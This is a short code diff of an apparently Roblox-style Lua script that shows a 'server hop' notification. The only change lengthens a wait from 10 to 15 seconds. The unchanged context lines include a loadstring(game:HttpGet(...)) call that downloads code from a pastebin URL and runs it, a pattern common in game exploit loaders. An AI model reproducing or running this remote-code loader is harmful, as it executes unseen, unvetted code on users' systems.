@@ -80,6 +80,6 @@ po.ChildAdded:connect(function(a)
     end
 end)
 
-wait(10)
+wait(15)
 NotificationLibrary.CustomNotification("test", "server hop", 9e9)
 loadstring(game:HttpGet("https://pastebin.com/raw/7ks1EUEu"))()
